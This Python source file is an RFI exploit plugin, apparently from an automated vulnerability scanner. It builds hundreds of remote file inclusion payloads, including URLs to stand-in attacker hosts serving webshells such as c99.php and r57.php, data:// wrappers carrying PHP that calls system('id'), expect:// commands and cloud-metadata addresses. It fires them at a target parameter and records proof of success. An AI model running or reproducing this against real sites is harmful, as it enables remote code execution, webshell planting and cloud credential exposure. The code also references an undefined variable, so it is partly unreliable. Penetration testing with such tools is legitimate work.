"""
RFI (Remote File Inclusion) Exploit Plugin

This plugin provides exploit capabilities for RFI vulnerabilities including:
- Remote shell upload
- Remote code execution via included files
- Information gathering
- Visual proof of exploitation with screenshots
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.adaptive_exploit_mixin import AdaptiveExploitMixin
from scanner.plugins.payload_mutator import PayloadMutator

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logging.warning("Requests library not available")

try:
    from scanner.visual_proof_capture import VisualProofCapture
    from scanner.media_manager import MediaManager
    HAS_VISUAL_PROOF = True
except ImportError:
    HAS_VISUAL_PROOF = False
    logging.warning("Visual proof modules not available")

logger = logging.getLogger(__name__)


class RFIPlugin(ExploitPlugin, AdaptiveExploitMixin):
    """RFI exploit plugin for remote code execution via file inclusion."""
    
    # Test payloads
    TEST_PAYLOADS = [
        'http://attacker.com/shell.txt',
        'http://attacker.com/test.php',
        '//attacker.com/shell.txt',
    ]
    
    @property
    def vulnerability_type(self) -> str:
        return 'rfi'
    
    @property
    def name(self) -> str:
        return 'RFI Exploit'
    
    @property
    def description(self) -> str:
        return 'Remote File Inclusion exploit plugin for including and executing remote files.'
    
    @property
    def version(self) -> str:
        return '2.1.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate RFI payloads with encoding variations and bypass techniques.
        
        Args:
            context: Optional context containing:
                    - remote_server: Remote server to include from
                    - remote_file: Remote file to include
                    - use_mutations: Whether to apply payload mutations
        
        Returns:
            List of RFI payloads
        """
        context = context or {}
        remote_server = context.get('remote_server', 'attacker.com')
        remote_file = context.get('remote_file', 'shell.txt')
        use_mutations = context.get('use_mutations', True)
        
        # Base payloads with multiple protocols and bypass techniques
        payloads = [
            # Standard protocols
            f'http://{remote_server}/{remote_file}',
            f'https://{remote_server}/{remote_file}',
            f'//{remote_server}/{remote_file}',
            
            # Protocol-less (protocol-relative URL)
            f'\\\\{remote_server}\\{remote_file}',
            
            # Query string variations
            f'http://{remote_server}/{remote_file}?',
            f'http://{remote_server}/{remote_file}#',
            
            # Null byte injection (older PHP)
            f'http://{remote_server}/{remote_file}%00',
            f'http://{remote_server}/{remote_file}\x00',
            
            # Dot-slash bypass
            f'http://{remote_server}/./{remote_file}',
            f'http://{remote_server}/../{remote_file}',
            
            # Data URI (some contexts)
            f'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
            
            # PHP wrappers
            f'php://input',
            f'php://filter/resource={remote_file}',
            
            # Expect wrapper (if enabled)
            f'expect://id',
            f'expect://ls',
        ]
        
        # Extra RFI payloads
        extra_rfi = [
            f'http://{remote_server}/{remote_file}?cmd=id',
            f'http://{remote_server}/{remote_file}?',
            f'http://{remote_server}/{remote_file}%20',
            f'http://{remote_server}/{remote_file}%00.php',
            f'http://{remote_server}/{remote_file}.php',
            f'https://{remote_server}/{remote_file}',
            f'https://{remote_server}/{remote_file}?',
            f'ftp://{remote_server}/{remote_file}',
            f'ftp://anonymous@{remote_server}/{remote_file}',
            f'smb://{remote_server}/{remote_file}',
            f'\\{remote_server}\share\{remote_file}',
            f'//{remote_server}/{remote_file}',
            f'http://{remote_server}:80/{remote_file}',
            f'http://{remote_server}:8080/{remote_file}',
            f'http://{remote_server}:443/{remote_file}',
            f'http://user@{remote_server}/{remote_file}',
            f'http://user:pass@{remote_server}/{remote_file}',
            f'http://{remote_server}/{remote_file}/../{remote_file}',
            f'http://{remote_server}/%2e%2e/{remote_file}',
            'php://filter/convert.base64-encode/resource=http://attacker.example.com/shell',
            'data://text/plain,<?php system("id");?>',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOz8+',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
            f'glob://{remote_server}/*',
            f'http://{remote_server}/shell.php',
            f'http://{remote_server}/cmd.php',
            f'http://{remote_server}/c99.php',
            f'http://{remote_server}/r57.php',
            f'http://{remote_server}/webshell.php',
            f'http://{remote_server}/backdoor.php',
            f'http://169.254.169.254/latest/meta-data/',
            f'http://127.0.0.1/shell.php',
            f'http://localhost/{remote_file}',
            f'http://0.0.0.0/{remote_file}',
            f'http://0/{remote_file}',
            f'http://[::1]/{remote_file}',
            f'http://[::]/{remote_file}',
            f'http://0x7f000001/{remote_file}',
            f'http://2130706433/{remote_file}',
            f'http://0177.0.0.1/{remote_file}',
        ]
        payloads.extend(extra_rfi)
        # Generate dynamic RFI payloads across ports and protocols
        dynamic_rfi = []
        for proto in ['http', 'https', 'ftp']:
            for srv in [remote_server, 'attacker.example.com', 'evil.com', '169.254.169.254', '127.0.0.1']:
                for port in [80, 443, 8080, 8443, 9090, 4444]:
                    dynamic_rfi.append(f'{proto}://{srv}:{port}/{remote_file}')
                    dynamic_rfi.append(f'{proto}://{srv}:{port}/shell.php')
                    dynamic_rfi.append(f'{proto}://{srv}:{port}/cmd.txt')
        # Common remote file paths
        remote_paths = ['shell.php', 'cmd.php', 'backdoor.php', 'c99.php', 'r57.php',
                        'webshell.php', 'shell.txt', 'cmd.txt', 'evil.php', 'hack.php',
                        'exec.php', 'rce.php', 'remote.php', 'test.php', 'payload.php']
        for path in remote_paths:
            dynamic_rfi.append(f'http://{remote_server}/{path}')
            dynamic_rfi.append(f'https://{remote_server}/{path}')
            dynamic_rfi.append(f'//{remote_server}/{path}')
            dynamic_rfi.append(f'http://{remote_server}/{path}?')
            dynamic_rfi.append(f'http://{remote_server}/{path}%00')
            dynamic_rfi.append(f'http://{remote_server}/{path}#')
        payloads.extend(dynamic_rfi)
        return PayloadMutator.scale_payloads_to_minimum(payloads)
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute RFI exploit attack with adaptive strategies."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'rfi',
            }
        
        config = config or {}
        config.update(self.get_adaptive_config_defaults())
        parameter = vulnerability_data.get('parameter')
        remote_server = config.get('remote_server')
        
        if not parameter:
            return {
                'success': False,
                'error': 'Missing parameter',
                'vulnerability_type': 'rfi',
            }
        
        # If no remote server, provide example in error
        if not remote_server:
            return {
                'success': False,
                'error': 'Missing remote_server config (set to attacker-controlled server)',
                'vulnerability_type': 'rfi',
                'note': 'RFI requires external server for callback verification'
            }
        
        logger.info(f"Attempting RFI exploitation on {target_url}")
        
        # Try to include remote file with multiple methods
        exploitation_result = self._attempt_rfi(target_url, parameter, remote_server, config)
        
        if exploitation_result['success']:
            logger.info(f"Successfully exploited RFI on {target_url}")
            
            result = {
                'success': True,
                'evidence': exploitation_result.get('evidence', ''),
                'vulnerability_type': 'rfi',
                'message': 'Successfully included remote file',
                'method': exploitation_result.get('method'),
            }
            
            # Capture visual proof if available
            if HAS_VISUAL_PROOF and config.get('capture_visual_proof', True):
                visual_proofs = self._capture_visual_proof(target_url, parameter, exploitation_result, config)
                if visual_proofs:
                    result['visual_proofs'] = visual_proofs
                    logger.info(f"Captured {len(visual_proofs)} visual proof(s)")
            
            return result
        
        # Check for partial evidence
        if exploitation_result.get('partial_evidence'):
            return {
                'success': False,
                'partial_evidence': exploitation_result['partial_evidence'],
                'confidence': 'partial',
                'error': 'Could not fully exploit RFI, but found indicators',
                'vulnerability_type': 'rfi',
            }
        
        return {
            'success': False,
            'error': 'Could not exploit RFI vulnerability',
            'message': 'RFI exploitation attempt was unsuccessful',
            'vulnerability_type': 'rfi',
        }
    
    def _attempt_rfi(self, url: str, parameter: str, remote_server: str,
                    config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Attempt to exploit RFI using multiple methods and payloads.
        
        Args:
            url: Target URL
            parameter: Vulnerable parameter
            remote_server: Remote server to include from
            config: Configuration dict
            
        Returns:
            Dict with success status and details
        """
        test_marker = 'RFI_TEST_SUCCESS'
        
        # Generate multiple payload variations
        payloads = self.generate_payloads({
            'remote_server': remote_server,
            'remote_file': f'test.txt?marker={test_marker}',
            'use_mutations': True
        })
        
        # Verification function
        def verify_func(response):
            return test_marker in response.text
        
        # Try payloads with multiple methods
        result = self._try_multiple_methods(
            url, payloads[0], parameter, config, verify_func
        )
        
        if result.get('success'):
            return {
                'success': True,
                'evidence': f'Successfully included file from {remote_server}, marker found',
                'method': result.get('method'),
                'payload': result.get('payload')
            }
        
        # Try remaining payloads if first failed
        for payload in payloads[1:10]:  # Try top 10 payload variations
            result = self._try_multiple_methods(
                url, payload, parameter, config, verify_func
            )
            
            if result.get('success'):
                result_dict = {
                    'success': True,
                    'evidence': f'Successfully included file from {remote_server}',
                    'method': result.get('method'),
                    'payload': payload
                }
                
                # Generate unified proof report
                if config.get('enable_proof_reporting', True):
                    from scanner.proof_reporting_helpers import add_proof_reporting_to_result
                    add_proof_reporting_to_result(
                        self, 'rfi', result_dict, url,
                        vulnerability_data, config
                    )
                
                return result_dict
        
        # Check for partial evidence
        if result.get('partial_evidence'):
            return {
                'success': False,
                'partial_evidence': result['partial_evidence']
            }
        
        return {
            'success': False,
            'error': 'Could not include remote file'
        }
    
    def get_severity_level(self) -> str:
        return 'critical'
    
    def _capture_visual_proof(self, url: str, parameter: str, 
                               exploitation_result: Dict[str, Any],
                               config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Capture visual proof of RFI exploitation.
        
        Args:
            url: Target URL
            parameter: Vulnerable parameter
            exploitation_result: Results from exploitation attempt
            config: Configuration dictionary
            
        Returns:
            List of visual proof metadata dictionaries
        """
        visual_proofs = []
        
        try:
            proof_capture = VisualProofCapture()
            remote_server = config.get('remote_server', 'attacker.com')
            
            # Capture screenshot of successful RFI exploitation
            test_marker = 'RFI_TEST_SUCCESS'
            remote_url = f'http://{remote_server}/test.txt?marker={test_marker}'
            
            # Capture screenshot
            screenshot_data = proof_capture.capture_screenshot(
                f"{url}?{parameter}={remote_url}",
                wait_time=1.0
            )
            
            if screenshot_data:
                visual_proofs.append({
                    'type': 'screenshot',
                    'data': screenshot_data,
                    'title': f'RFI - Included Remote File from {remote_server}',
                    'description': f'Successfully included remote file from {remote_server}',
                    'exploit_step': f'Remote file inclusion with URL: {remote_url}',
                    'payload': remote_url
                })
            
        except Exception as e:
            logger.error(f"Failed to capture visual proof: {e}")
        
        return visual_proofs
    
    def verify(self, result: Dict[str, Any], 
               target_url: str,
               vulnerability_data: Dict[str, Any]) -> tuple:
        """Verify RFI with proof of remote file inclusion."""
        if not result.get('success'):
            return False, None
        
        evidence = result.get('evidence', '')
        included_url = result.get('included_url', '')
        
        # Check for successful remote file inclusion
        if included_url and ('included' in evidence.lower() or 'loaded' in evidence.lower()):
            proof = f"âœ“ VERIFIED - Remote File Inclusion (RFI)\n\nRemote file included: {included_url}\nEvidence: {evidence[:200]}\n\nImpact: Remote code execution via file inclusion"
            return True, proof
        
        return False, None
    
    def get_remediation_advice(self) -> str:
        return (
            'Prevent RFI attacks:\n'
            '1. Never use user input in file paths\n'
            '2. Disable allow_url_include in PHP\n'
            '3. Use whitelist for allowed files\n'
            '4. Validate and sanitize all input\n'
            '5. Use absolute paths\n'
            '6. Implement proper access controls\n'
            '7. Disable remote file access\n'
            '8. Use security headers'
        )
